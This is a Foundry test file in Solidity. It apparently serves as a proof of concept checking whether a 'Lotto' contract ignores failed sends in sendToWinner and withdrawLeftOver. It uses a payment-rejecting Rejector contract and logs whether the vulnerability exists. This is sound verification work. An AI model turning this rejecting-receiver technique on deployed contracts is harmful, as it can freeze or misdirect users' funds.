// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lotto.sol";

contract LottoTest is Test {
    Lotto public lotto;
    address public winner = address(0x1);
    address public owner = address(0x2);
    uint256 public winAmount = 1 ether;
    uint256 public ticketPrice = 0.1 ether;

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        lotto = new Lotto();
        
        // Set up test scenario
        vm.prank(owner);
        lotto.setWinner(winner, winAmount);
        
        // Fund the contract by buying multiple tickets
        vm.prank(owner);
        lotto.buyTicket{value: ticketPrice}();
        vm.prank(owner);
        lotto.buyTicket{value: ticketPrice}();
    }

    function testUncheckedSendToWinner() public {
        // Create a contract that will reject payments
        Rejector rejector = new Rejector();
        
        console2.log("--- BEFORE-Trigger sendToWinner ---");
        bool prePayedOut = lotto.payedOut();
        uint256 preContractBalance = address(lotto).balance;
        uint256 preRejectorBalance = address(rejector).balance;
        console2.log("Pre-state: payedOut =", prePayedOut);
        console2.log("Pre-state: contract balance =", preContractBalance);
        console2.log("Pre-state: rejector balance =", preRejectorBalance);

        // Set rejector as winner
        vm.prank(owner);
        lotto.setWinner(address(rejector), 0.1 ether); // Adjusted to valid amount

        console2.log("--- Trigger sendToWinner ---");
        // Send to winner - this should fail silently
        lotto.sendToWinner();

        console2.log("--- AFTER-Trigger sendToWinner ---");
        bool postPayedOut = lotto.payedOut();
        uint256 postContractBalance = address(lotto).balance;
        uint256 postRejectorBalance = address(rejector).balance;
        console2.log("Post-state: payedOut =", postPayedOut);
        console2.log("Post-state: contract balance =", postContractBalance);
        console2.log("Post-state: rejector balance =", postRejectorBalance);

        // Vulnerability verification
        bool stateUpdated = (prePayedOut != postPayedOut) && postPayedOut;
        bool balancesUnchanged = (preContractBalance == postContractBalance) && 
                                (preRejectorBalance == postRejectorBalance);
        
        if (stateUpdated && balancesUnchanged) {
            console2.log("Vulnerability Exists: State updated despite failed payment");
        } else {
            console2.log("Vulnerability not Exist: No state change or balances modified");
        }
    }

    function testUncheckedWithdrawLeftover() public {
        // First complete payout to winner
        lotto.sendToWinner();
        
        // Create a contract that will reject payments
        Rejector rejector = new Rejector();
        
        console2.log("--- BEFORE-Trigger withdrawLeftOver ---");
        uint256 preContractBalance = address(lotto).balance;
        uint256 preRejectorBalance = address(rejector).balance;
        console2.log("Pre-state: contract balance =", preContractBalance);
        console2.log("Pre-state: rejector balance =", preRejectorBalance);

        console2.log("--- Trigger withdrawLeftOver ---");
        // Set rejector as msg.sender
        vm.prank(address(rejector));
        lotto.withdrawLeftOver();

        console2.log("--- AFTER-Trigger withdrawLeftOver ---");
        uint256 postContractBalance = address(lotto).balance;
        uint256 postRejectorBalance = address(rejector).balance;
        console2.log("Post-state: contract balance =", postContractBalance);
        console2.log("Post-state: rejector balance =", postRejectorBalance);

        // Vulnerability verification
        bool fundsNotTransferred = (preContractBalance == postContractBalance) && 
                                  (preRejectorBalance == postRejectorBalance);
        
        if (fundsNotTransferred && postContractBalance > 0) {
            console2.log("Vulnerability Exists: Funds not transferred but state unchanged");
        } else {
            console2.log("Vulnerability not Exist: Funds transferred or contract balance zero");
        }
    }
}

contract Rejector {
    receive() external payable {
        revert("Rejecting payments");
    }
}